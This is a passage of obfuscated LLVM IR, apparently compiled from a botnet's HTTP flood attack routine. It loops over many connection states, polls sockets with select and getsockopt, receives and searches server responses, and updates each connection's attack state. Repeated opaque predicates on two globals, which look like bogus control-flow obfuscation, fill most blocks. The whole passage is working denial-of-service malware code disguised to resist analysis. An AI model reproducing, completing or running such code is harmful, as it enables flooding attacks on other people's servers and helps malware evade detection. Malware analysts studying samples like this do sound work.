  %1231 = add nsw i32 %1230, 1
  store i32 %1231, i32* %23, align 4
  br label %1232

; <label>:1232:                                   ; preds = %1227, %1206
  br label %1290

; <label>:1233:                                   ; preds = %1200
  %1234 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1235 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1234, i32 0, i32 1
  %1236 = load i8, i8* %1235, align 4
  %1237 = zext i8 %1236 to i32
  %1238 = icmp eq i32 %1237, 11
  br i1 %1238, label %1239, label %1248

; <label>:1239:                                   ; preds = %1233
  %1240 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1241 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1240, i32 0, i32 1
  store i8 0, i8* %1241, align 4
  %1242 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1243 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1242, i32 0, i32 0
  %1244 = load i32, i32* %1243, align 4
  %1245 = call i32 @close(i32 %1244)
  %1246 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1247 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1246, i32 0, i32 0
  store i32 -1, i32* %1247, align 4
  br label %1273

; <label>:1248:                                   ; preds = %1233
  %1249 = load i32, i32* @x.17
  %1250 = load i32, i32* @y.18
  %1251 = sub i32 %1249, 1
  %1252 = mul i32 %1249, %1251
  %1253 = urem i32 %1252, 2
  %1254 = icmp eq i32 %1253, 0
  %1255 = icmp slt i32 %1250, 10
  %1256 = or i1 %1254, %1255
  br i1 %1256, label %originalBB180, label %originalBB180alteredBB

originalBB180:                                    ; preds = %originalBB180alteredBB, %1248
  %1257 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1258 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1257, i32 0, i32 1
  store i8 0, i8* %1258, align 4
  %1259 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1260 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1259, i32 0, i32 0
  %1261 = load i32, i32* %1260, align 4
  %1262 = call i32 @close(i32 %1261)
  %1263 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1264 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1263, i32 0, i32 0
  store i32 -1, i32* %1264, align 4
  %1265 = load i32, i32* @x.17
  %1266 = load i32, i32* @y.18
  %1267 = sub i32 %1265, 1
  %1268 = mul i32 %1265, %1267
  %1269 = urem i32 %1268, 2
  %1270 = icmp eq i32 %1269, 0
  %1271 = icmp slt i32 %1266, 10
  %1272 = or i1 %1270, %1271
  br i1 %1272, label %originalBBpart2182, label %originalBB180alteredBB

originalBBpart2182:                               ; preds = %originalBB180
  br label %1273

; <label>:1273:                                   ; preds = %originalBBpart2182, %1239
  %1274 = load i32, i32* @x.17
  %1275 = load i32, i32* @y.18
  %1276 = sub i32 %1274, 1
  %1277 = mul i32 %1274, %1276
  %1278 = urem i32 %1277, 2
  %1279 = icmp eq i32 %1278, 0
  %1280 = icmp slt i32 %1275, 10
  %1281 = or i1 %1279, %1280
  br i1 %1281, label %originalBB184, label %originalBB184alteredBB

originalBB184:                                    ; preds = %originalBB184alteredBB, %1273
  %1282 = load i32, i32* @x.17
  %1283 = load i32, i32* @y.18
  %1284 = sub i32 %1282, 1
  %1285 = mul i32 %1282, %1284
  %1286 = urem i32 %1285, 2
  %1287 = icmp eq i32 %1286, 0
  %1288 = icmp slt i32 %1283, 10
  %1289 = or i1 %1287, %1288
  br i1 %1289, label %originalBBpart2186, label %originalBB184alteredBB

originalBBpart2186:                               ; preds = %originalBB184
  br label %1290

; <label>:1290:                                   ; preds = %originalBBpart2186, %1232
  br label %1291

; <label>:1291:                                   ; preds = %1290, %1199
  %1292 = load i32, i32* @x.17
  %1293 = load i32, i32* @y.18
  %1294 = sub i32 %1292, 1
  %1295 = mul i32 %1292, %1294
  %1296 = urem i32 %1295, 2
  %1297 = icmp eq i32 %1296, 0
  %1298 = icmp slt i32 %1293, 10
  %1299 = or i1 %1297, %1298
  br i1 %1299, label %originalBB188, label %originalBB188alteredBB

originalBB188:                                    ; preds = %originalBB188alteredBB, %1291
  %1300 = load i32, i32* @x.17
  %1301 = load i32, i32* @y.18
  %1302 = sub i32 %1300, 1
  %1303 = mul i32 %1300, %1302
  %1304 = urem i32 %1303, 2
  %1305 = icmp eq i32 %1304, 0
  %1306 = icmp slt i32 %1301, 10
  %1307 = or i1 %1305, %1306
  br i1 %1307, label %originalBBpart2190, label %originalBB188alteredBB

originalBBpart2190:                               ; preds = %originalBB188
  br label %1308

; <label>:1308:                                   ; preds = %originalBBpart2190, %1166
  br label %1309

; <label>:1309:                                   ; preds = %1308, %1101
  br label %1310

; <label>:1310:                                   ; preds = %1309, %789
  br label %1311

; <label>:1311:                                   ; preds = %1310, %692
  br label %1312

; <label>:1312:                                   ; preds = %1311, %originalBBpart287, %613
  %1313 = load i32, i32* %9, align 4
  %1314 = add nsw i32 %1313, 1
  store i32 %1314, i32* %9, align 4
  br label %517

; <label>:1315:                                   ; preds = %517
  %1316 = load i32, i32* %23, align 4
  %1317 = icmp eq i32 %1316, 0
  br i1 %1317, label %1318, label %1319

; <label>:1318:                                   ; preds = %1315
  br label %462

; <label>:1319:                                   ; preds = %1315
  %1320 = load i32, i32* @x.17
  %1321 = load i32, i32* @y.18
  %1322 = sub i32 %1320, 1
  %1323 = mul i32 %1320, %1322
  %1324 = urem i32 %1323, 2
  %1325 = icmp eq i32 %1324, 0
  %1326 = icmp slt i32 %1321, 10
  %1327 = or i1 %1325, %1326
  br i1 %1327, label %originalBB192, label %originalBB192alteredBB

originalBB192:                                    ; preds = %originalBB192alteredBB, %1319
  %1328 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 1
  store i64 0, i64* %1328, align 8
  %1329 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 0
  store i64 1, i64* %1329, align 8
  %1330 = load i32, i32* %23, align 4
  %1331 = call i32 @select(i32 %1330, %struct.fd_set* %21, %struct.fd_set* %22, %struct.fd_set* null, %struct.timeval* %25)
  store i32 %1331, i32* %24, align 4
  %1332 = call i64 @time(i64* null) #6
  %1333 = trunc i64 %1332 to i32
  store i32 %1333, i32* %27, align 4
  %1334 = load i32, i32* %24, align 4
  %1335 = icmp slt i32 %1334, 1
  %1336 = load i32, i32* @x.17
  %1337 = load i32, i32* @y.18
  %1338 = sub i32 %1336, 1
  %1339 = mul i32 %1336, %1338
  %1340 = urem i32 %1339, 2
  %1341 = icmp eq i32 %1340, 0
  %1342 = icmp slt i32 %1337, 10
  %1343 = or i1 %1341, %1342
  br i1 %1343, label %originalBBpart2194, label %originalBB192alteredBB

originalBBpart2194:                               ; preds = %originalBB192
  br i1 %1335, label %1344, label %1345

; <label>:1344:                                   ; preds = %originalBBpart2194
  br label %462

; <label>:1345:                                   ; preds = %originalBBpart2194
  store i32 0, i32* %9, align 4
  br label %1346

; <label>:1346:                                   ; preds = %originalBBpart2741, %1345
  %1347 = load i32, i32* %9, align 4
  %1348 = load i32, i32* %18, align 4
  %1349 = icmp slt i32 %1347, %1348
  br i1 %1349, label %1350, label %4140

; <label>:1350:                                   ; preds = %1346
  %1351 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %1352 = load i32, i32* %9, align 4
  %1353 = sext i32 %1352 to i64
  %1354 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1351, i64 %1353
  store %struct.attack_http_state* %1354, %struct.attack_http_state** %26, align 8
  %1355 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1356 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1355, i32 0, i32 0
  %1357 = load i32, i32* %1356, align 4
  %1358 = icmp eq i32 %1357, -1
  br i1 %1358, label %1359, label %1376

; <label>:1359:                                   ; preds = %1350
  %1360 = load i32, i32* @x.17
  %1361 = load i32, i32* @y.18
  %1362 = sub i32 %1360, 1
  %1363 = mul i32 %1360, %1362
  %1364 = urem i32 %1363, 2
  %1365 = icmp eq i32 %1364, 0
  %1366 = icmp slt i32 %1361, 10
  %1367 = or i1 %1365, %1366
  br i1 %1367, label %originalBB196, label %originalBB196alteredBB

originalBB196:                                    ; preds = %originalBB196alteredBB, %1359
  %1368 = load i32, i32* @x.17
  %1369 = load i32, i32* @y.18
  %1370 = sub i32 %1368, 1
  %1371 = mul i32 %1368, %1370
  %1372 = urem i32 %1371, 2
  %1373 = icmp eq i32 %1372, 0
  %1374 = icmp slt i32 %1369, 10
  %1375 = or i1 %1373, %1374
  br i1 %1375, label %originalBBpart2198, label %originalBB196alteredBB

originalBBpart2198:                               ; preds = %originalBB196
  br label %4121

; <label>:1376:                                   ; preds = %1350
  %1377 = load i32, i32* @x.17
  %1378 = load i32, i32* @y.18
  %1379 = sub i32 %1377, 1
  %1380 = mul i32 %1377, %1379
  %1381 = urem i32 %1380, 2
  %1382 = icmp eq i32 %1381, 0
  %1383 = icmp slt i32 %1378, 10
  %1384 = or i1 %1382, %1383
  br i1 %1384, label %originalBB200, label %originalBB200alteredBB

originalBB200:                                    ; preds = %originalBB200alteredBB, %1376
  %1385 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %1386 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1387 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1386, i32 0, i32 0
  %1388 = load i32, i32* %1387, align 4
  %1389 = sdiv i32 %1388, 64
  %1390 = sext i32 %1389 to i64
  %1391 = getelementptr inbounds [16 x i64], [16 x i64]* %1385, i64 0, i64 %1390
  %1392 = load i64, i64* %1391, align 8
  %1393 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1394 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1393, i32 0, i32 0
  %1395 = load i32, i32* %1394, align 4
  %1396 = srem i32 %1395, 64
  %1397 = zext i32 %1396 to i64
  %1398 = shl i64 1, %1397
  %1399 = and i64 %1392, %1398
  %1400 = icmp ne i64 %1399, 0
  %1401 = load i32, i32* @x.17
  %1402 = load i32, i32* @y.18
  %1403 = sub i32 %1401, 1
  %1404 = mul i32 %1401, %1403
  %1405 = urem i32 %1404, 2
  %1406 = icmp eq i32 %1405, 0
  %1407 = icmp slt i32 %1402, 10
  %1408 = or i1 %1406, %1407
  br i1 %1408, label %originalBBpart2221, label %originalBB200alteredBB

originalBBpart2221:                               ; preds = %originalBB200
  br i1 %1400, label %1409, label %1481

; <label>:1409:                                   ; preds = %originalBBpart2221
  %1410 = load i32, i32* @x.17
  %1411 = load i32, i32* @y.18
  %1412 = sub i32 %1410, 1
  %1413 = mul i32 %1410, %1412
  %1414 = urem i32 %1413, 2
  %1415 = icmp eq i32 %1414, 0
  %1416 = icmp slt i32 %1411, 10
  %1417 = or i1 %1415, %1416
  br i1 %1417, label %originalBB223, label %originalBB223alteredBB

originalBB223:                                    ; preds = %originalBB223alteredBB, %1409
  store i32 0, i32* %35, align 4
  store i32 4, i32* %36, align 4
  %1418 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1419 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1418, i32 0, i32 0
  %1420 = load i32, i32* %1419, align 4
  %1421 = bitcast i32* %35 to i8*
  %1422 = call i32 @getsockopt(i32 %1420, i32 1, i32 4, i8* %1421, i32* %36) #6
  store i32 %1422, i32* %12, align 4
  %1423 = load i32, i32* %35, align 4
  %1424 = icmp eq i32 %1423, 0
  %1425 = load i32, i32* @x.17
  %1426 = load i32, i32* @y.18
  %1427 = sub i32 %1425, 1
  %1428 = mul i32 %1425, %1427
  %1429 = urem i32 %1428, 2
  %1430 = icmp eq i32 %1429, 0
  %1431 = icmp slt i32 %1426, 10
  %1432 = or i1 %1430, %1431
  br i1 %1432, label %originalBBpart2225, label %originalBB223alteredBB

originalBBpart2225:                               ; preds = %originalBB223
  br i1 %1424, label %1433, label %1439

; <label>:1433:                                   ; preds = %originalBBpart2225
  %1434 = load i32, i32* %12, align 4
  %1435 = icmp eq i32 %1434, 0
  br i1 %1435, label %1436, label %1439

; <label>:1436:                                   ; preds = %1433
  %1437 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1438 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1437, i32 0, i32 1
  store i8 4, i8* %1438, align 4
  br label %1464

; <label>:1439:                                   ; preds = %1433, %originalBBpart2225
  %1440 = load i32, i32* @x.17
  %1441 = load i32, i32* @y.18
  %1442 = sub i32 %1440, 1
  %1443 = mul i32 %1440, %1442
  %1444 = urem i32 %1443, 2
  %1445 = icmp eq i32 %1444, 0
  %1446 = icmp slt i32 %1441, 10
  %1447 = or i1 %1445, %1446
  br i1 %1447, label %originalBB227, label %originalBB227alteredBB

originalBB227:                                    ; preds = %originalBB227alteredBB, %1439
  %1448 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1449 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1448, i32 0, i32 0
  %1450 = load i32, i32* %1449, align 4
  %1451 = call i32 @close(i32 %1450)
  %1452 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1453 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1452, i32 0, i32 0
  store i32 -1, i32* %1453, align 4
  %1454 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1455 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1454, i32 0, i32 1
  store i8 0, i8* %1455, align 4
  %1456 = load i32, i32* @x.17
  %1457 = load i32, i32* @y.18
  %1458 = sub i32 %1456, 1
  %1459 = mul i32 %1456, %1458
  %1460 = urem i32 %1459, 2
  %1461 = icmp eq i32 %1460, 0
  %1462 = icmp slt i32 %1457, 10
  %1463 = or i1 %1461, %1462
  br i1 %1463, label %originalBBpart2230, label %originalBB227alteredBB

originalBBpart2230:                               ; preds = %originalBB227
  br label %4121

; <label>:1464:                                   ; preds = %1436
  %1465 = load i32, i32* @x.17
  %1466 = load i32, i32* @y.18
  %1467 = sub i32 %1465, 1
  %1468 = mul i32 %1465, %1467
  %1469 = urem i32 %1468, 2
  %1470 = icmp eq i32 %1469, 0
  %1471 = icmp slt i32 %1466, 10
  %1472 = or i1 %1470, %1471
  br i1 %1472, label %originalBB232, label %originalBB232alteredBB

originalBB232:                                    ; preds = %originalBB232alteredBB, %1464
  %1473 = load i32, i32* @x.17
  %1474 = load i32, i32* @y.18
  %1475 = sub i32 %1473, 1
  %1476 = mul i32 %1473, %1475
  %1477 = urem i32 %1476, 2
  %1478 = icmp eq i32 %1477, 0
  %1479 = icmp slt i32 %1474, 10
  %1480 = or i1 %1478, %1479
  br i1 %1480, label %originalBBpart2234, label %originalBB232alteredBB

originalBBpart2234:                               ; preds = %originalBB232
  br label %1481

; <label>:1481:                                   ; preds = %originalBBpart2234, %originalBBpart2221
  %1482 = load i32, i32* @x.17
  %1483 = load i32, i32* @y.18
  %1484 = sub i32 %1482, 1
  %1485 = mul i32 %1482, %1484
  %1486 = urem i32 %1485, 2
  %1487 = icmp eq i32 %1486, 0
  %1488 = icmp slt i32 %1483, 10
  %1489 = or i1 %1487, %1488
  br i1 %1489, label %originalBB236, label %originalBB236alteredBB

originalBB236:                                    ; preds = %originalBB236alteredBB, %1481
  %1490 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1491 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1492 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1491, i32 0, i32 0
  %1493 = load i32, i32* %1492, align 4
  %1494 = sdiv i32 %1493, 64
  %1495 = sext i32 %1494 to i64
  %1496 = getelementptr inbounds [16 x i64], [16 x i64]* %1490, i64 0, i64 %1495
  %1497 = load i64, i64* %1496, align 8
  %1498 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1499 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1498, i32 0, i32 0
  %1500 = load i32, i32* %1499, align 4
  %1501 = srem i32 %1500, 64
  %1502 = zext i32 %1501 to i64
  %1503 = shl i64 1, %1502
  %1504 = and i64 %1497, %1503
  %1505 = icmp ne i64 %1504, 0
  %1506 = load i32, i32* @x.17
  %1507 = load i32, i32* @y.18
  %1508 = sub i32 %1506, 1
  %1509 = mul i32 %1506, %1508
  %1510 = urem i32 %1509, 2
  %1511 = icmp eq i32 %1510, 0
  %1512 = icmp slt i32 %1507, 10
  %1513 = or i1 %1511, %1512
  br i1 %1513, label %originalBBpart2268, label %originalBB236alteredBB

originalBBpart2268:                               ; preds = %originalBB236
  br i1 %1505, label %1514, label %4120

; <label>:1514:                                   ; preds = %originalBBpart2268
  %1515 = load i32, i32* @x.17
  %1516 = load i32, i32* @y.18
  %1517 = sub i32 %1515, 1
  %1518 = mul i32 %1515, %1517
  %1519 = urem i32 %1518, 2
  %1520 = icmp eq i32 %1519, 0
  %1521 = icmp slt i32 %1516, 10
  %1522 = or i1 %1520, %1521
  br i1 %1522, label %originalBB270, label %originalBB270alteredBB

originalBB270:                                    ; preds = %originalBB270alteredBB, %1514
  %1523 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1524 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1523, i32 0, i32 1
  %1525 = load i8, i8* %1524, align 4
  %1526 = zext i8 %1525 to i32
  %1527 = icmp eq i32 %1526, 6
  %1528 = load i32, i32* @x.17
  %1529 = load i32, i32* @y.18
  %1530 = sub i32 %1528, 1
  %1531 = mul i32 %1528, %1530
  %1532 = urem i32 %1531, 2
  %1533 = icmp eq i32 %1532, 0
  %1534 = icmp slt i32 %1529, 10
  %1535 = or i1 %1533, %1534
  br i1 %1535, label %originalBBpart2272, label %originalBB270alteredBB

originalBBpart2272:                               ; preds = %originalBB270
  br i1 %1527, label %1536, label %3363

; <label>:1536:                                   ; preds = %originalBBpart2272
  %1537 = load i32, i32* @x.17
  %1538 = load i32, i32* @y.18
  %1539 = sub i32 %1537, 1
  %1540 = mul i32 %1537, %1539
  %1541 = urem i32 %1540, 2
  %1542 = icmp eq i32 %1541, 0
  %1543 = icmp slt i32 %1538, 10
  %1544 = or i1 %1542, %1543
  br i1 %1544, label %originalBB274, label %originalBB274alteredBB

originalBB274:                                    ; preds = %originalBB274alteredBB, %1536
  store i32 0, i32* %37, align 4
  %1545 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  call void @util_zero(i8* %1545, i32 10240)
  %1546 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1547 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1546, i32 0, i32 0
  %1548 = load i32, i32* %1547, align 4
  %1549 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1550 = call i64 @recv(i32 %1548, i8* %1549, i64 10240, i32 16386)
  %1551 = trunc i64 %1550 to i32
  store i32 %1551, i32* %12, align 4
  %1552 = icmp slt i32 %1551, 1
  %1553 = load i32, i32* @x.17
  %1554 = load i32, i32* @y.18
  %1555 = sub i32 %1553, 1
  %1556 = mul i32 %1553, %1555
  %1557 = urem i32 %1556, 2
  %1558 = icmp eq i32 %1557, 0
  %1559 = icmp slt i32 %1554, 10
  %1560 = or i1 %1558, %1559
  br i1 %1560, label %originalBBpart2276, label %originalBB274alteredBB

originalBBpart2276:                               ; preds = %originalBB274
  br i1 %1552, label %1561, label %1570

; <label>:1561:                                   ; preds = %originalBBpart2276
  %1562 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1563 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1562, i32 0, i32 0
  %1564 = load i32, i32* %1563, align 4
  %1565 = call i32 @close(i32 %1564)
  %1566 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1567 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1566, i32 0, i32 0
  store i32 -1, i32* %1567, align 4
  %1568 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1569 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1568, i32 0, i32 1
  store i8 0, i8* %1569, align 4
  br label %4121

; <label>:1570:                                   ; preds = %originalBBpart2276
  %1571 = load i32, i32* @x.17
  %1572 = load i32, i32* @y.18
  %1573 = sub i32 %1571, 1
  %1574 = mul i32 %1571, %1573
  %1575 = urem i32 %1574, 2
  %1576 = icmp eq i32 %1575, 0
  %1577 = icmp slt i32 %1572, 10
  %1578 = or i1 %1576, %1577
  br i1 %1578, label %originalBB278, label %originalBB278alteredBB

originalBB278:                                    ; preds = %originalBB278alteredBB, %1570
  %1579 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1580 = load i32, i32* %12, align 4
  %1581 = call i32 @util_memsearch(i8* %1579, i32 %1580, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1582 = icmp eq i32 %1581, -1
  %1583 = load i32, i32* @x.17
  %1584 = load i32, i32* @y.18
  %1585 = sub i32 %1583, 1
  %1586 = mul i32 %1583, %1585
  %1587 = urem i32 %1586, 2
  %1588 = icmp eq i32 %1587, 0
  %1589 = icmp slt i32 %1584, 10
  %1590 = or i1 %1588, %1589
  br i1 %1590, label %originalBBpart2280, label %originalBB278alteredBB

originalBBpart2280:                               ; preds = %originalBB278
  br i1 %1582, label %1591, label %1611

; <label>:1591:                                   ; preds = %originalBBpart2280
  %1592 = load i32, i32* @x.17
  %1593 = load i32, i32* @y.18
  %1594 = sub i32 %1592, 1
  %1595 = mul i32 %1592, %1594
  %1596 = urem i32 %1595, 2
  %1597 = icmp eq i32 %1596, 0
  %1598 = icmp slt i32 %1593, 10
  %1599 = or i1 %1597, %1598
  br i1 %1599, label %originalBB282, label %originalBB282alteredBB

originalBB282:                                    ; preds = %originalBB282alteredBB, %1591
  %1600 = load i32, i32* %12, align 4
  %1601 = icmp slt i32 %1600, 10240
  %1602 = load i32, i32* @x.17
  %1603 = load i32, i32* @y.18
  %1604 = sub i32 %1602, 1
  %1605 = mul i32 %1602, %1604
  %1606 = urem i32 %1605, 2
  %1607 = icmp eq i32 %1606, 0
  %1608 = icmp slt i32 %1603, 10
  %1609 = or i1 %1607, %1608
  br i1 %1609, label %originalBBpart2284, label %originalBB282alteredBB

originalBBpart2284:                               ; preds = %originalBB282
  br i1 %1601, label %1610, label %1611

; <label>:1610:                                   ; preds = %originalBBpart2284
  br label %4121

; <label>:1611:                                   ; preds = %originalBBpart2284, %originalBBpart2280
  %1612 = load i32, i32* @x.17
  %1613 = load i32, i32* @y.18
  %1614 = sub i32 %1612, 1
  %1615 = mul i32 %1612, %1614
  %1616 = urem i32 %1615, 2
  %1617 = icmp eq i32 %1616, 0
  %1618 = icmp slt i32 %1613, 10
  %1619 = or i1 %1617, %1618
  br i1 %1619, label %originalBB286, label %originalBB286alteredBB

originalBB286:                                    ; preds = %originalBB286alteredBB, %1611
  %1620 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1621 = load i32, i32* %12, align 4
  %1622 = call i32 @util_memsearch(i8* %1620, i32 %1621, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1623 = sext i32 %1622 to i64
  %1624 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1623
  store i8 0, i8* %1624, align 1
  %1625 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1626 = load i32, i32* %12, align 4
  %1627 = call i8* @table_retrieve_val(i32 62, i32* null)
  %1628 = call i32 @util_stristr(i8* %1625, i32 %1626, i8* %1627)
  %1629 = icmp ne i32 %1628, -1
  %1630 = load i32, i32* @x.17
  %1631 = load i32, i32* @y.18
  %1632 = sub i32 %1630, 1
  %1633 = mul i32 %1630, %1632
  %1634 = urem i32 %1633, 2
  %1635 = icmp eq i32 %1634, 0
  %1636 = icmp slt i32 %1631, 10
  %1637 = or i1 %1635, %1636
  br i1 %1637, label %originalBBpart2288, label %originalBB286alteredBB

originalBBpart2288:                               ; preds = %originalBB286
  br i1 %1629, label %1638, label %1657

; <label>:1638:                                   ; preds = %originalBBpart2288
  %1639 = load i32, i32* @x.17
  %1640 = load i32, i32* @y.18
  %1641 = sub i32 %1639, 1
  %1642 = mul i32 %1639, %1641
  %1643 = urem i32 %1642, 2
  %1644 = icmp eq i32 %1643, 0
  %1645 = icmp slt i32 %1640, 10
  %1646 = or i1 %1644, %1645
  br i1 %1646, label %originalBB290, label %originalBB290alteredBB

originalBB290:                                    ; preds = %originalBB290alteredBB, %1638
  %1647 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1648 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1647, i32 0, i32 11
  store i32 2, i32* %1648, align 4
  %1649 = load i32, i32* @x.17
  %1650 = load i32, i32* @y.18
  %1651 = sub i32 %1649, 1
  %1652 = mul i32 %1649, %1651
  %1653 = urem i32 %1652, 2
  %1654 = icmp eq i32 %1653, 0
  %1655 = icmp slt i32 %1650, 10
  %1656 = or i1 %1654, %1655
  br i1 %1656, label %originalBBpart2292, label %originalBB290alteredBB

originalBBpart2292:                               ; preds = %originalBB290
  br label %1657

; <label>:1657:                                   ; preds = %originalBBpart2292, %originalBBpart2288
  %1658 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1659 = load i32, i32* %12, align 4
  %1660 = call i8* @table_retrieve_val(i32 61, i32* null)
  %1661 = call i32 @util_stristr(i8* %1658, i32 %1659, i8* %1660)
  %1662 = icmp ne i32 %1661, -1
  br i1 %1662, label %1663, label %1682

; <label>:1663:                                   ; preds = %1657
  %1664 = load i32, i32* @x.17
  %1665 = load i32, i32* @y.18
  %1666 = sub i32 %1664, 1
  %1667 = mul i32 %1664, %1666
  %1668 = urem i32 %1667, 2
  %1669 = icmp eq i32 %1668, 0
  %1670 = icmp slt i32 %1665, 10
  %1671 = or i1 %1669, %1670
  br i1 %1671, label %originalBB294, label %originalBB294alteredBB

originalBB294:                                    ; preds = %originalBB294alteredBB, %1663
  %1672 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1673 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1672, i32 0, i32 11
  store i32 1, i32* %1673, align 4
  %1674 = load i32, i32* @x.17
  %1675 = load i32, i32* @y.18
  %1676 = sub i32 %1674, 1
  %1677 = mul i32 %1674, %1676
  %1678 = urem i32 %1677, 2
  %1679 = icmp eq i32 %1678, 0
  %1680 = icmp slt i32 %1675, 10
  %1681 = or i1 %1679, %1680
  br i1 %1681, label %originalBBpart2296, label %originalBB294alteredBB

originalBBpart2296:                               ; preds = %originalBB294
  br label %1682

; <label>:1682:                                   ; preds = %originalBBpart2296, %1657
  %1683 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1684 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1683, i32 0, i32 12
  store i32 0, i32* %1684, align 4
  %1685 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1686 = load i32, i32* %12, align 4
  %1687 = call i8* @table_retrieve_val(i32 60, i32* null)
  %1688 = call i32 @util_stristr(i8* %1685, i32 %1686, i8* %1687)
  %1689 = icmp ne i32 %1688, -1
  br i1 %1689, label %1690, label %1757

; <label>:1690:                                   ; preds = %1682
  %1691 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1692 = load i32, i32* %12, align 4
  %1693 = call i8* @table_retrieve_val(i32 60, i32* null)
  %1694 = call i32 @util_stristr(i8* %1691, i32 %1692, i8* %1693)
  store i32 %1694, i32* %38, align 4
  %1695 = load i32, i32* %38, align 4
  %1696 = sext i32 %1695 to i64
  %1697 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1696
  %1698 = load i8, i8* %1697, align 1
  %1699 = sext i8 %1698 to i32
  %1700 = icmp eq i32 %1699, 32
  br i1 %1700, label %1701, label %1704

; <label>:1701:                                   ; preds = %1690
  %1702 = load i32, i32* %38, align 4
  %1703 = add nsw i32 %1702, 1
  store i32 %1703, i32* %38, align 4
  br label %1704

; <label>:1704:                                   ; preds = %1701, %1690
  %1705 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1706 = load i32, i32* %38, align 4
  %1707 = sext i32 %1706 to i64
  %1708 = getelementptr inbounds i8, i8* %1705, i64 %1707
  %1709 = load i32, i32* %12, align 4
  %1710 = load i32, i32* %38, align 4
  %1711 = sub nsw i32 %1709, %1710
  %1712 = call i32 @util_memsearch(i8* %1708, i32 %1711, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1712, i32* %39, align 4
  %1713 = load i32, i32* %39, align 4
  %1714 = icmp ne i32 %1713, -1
  br i1 %1714, label %1715, label %1756

; <label>:1715:                                   ; preds = %1704
  %1716 = load i32, i32* %38, align 4
  %1717 = sext i32 %1716 to i64
  %1718 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1717
  store i8* %1718, i8** %40, align 8
  %1719 = load i32, i32* %39, align 4
  %1720 = icmp sge i32 %1719, 2
  br i1 %1720, label %1721, label %1724

; <label>:1721:                                   ; preds = %1715
  %1722 = load i32, i32* %39, align 4
  %1723 = sub nsw i32 %1722, 2
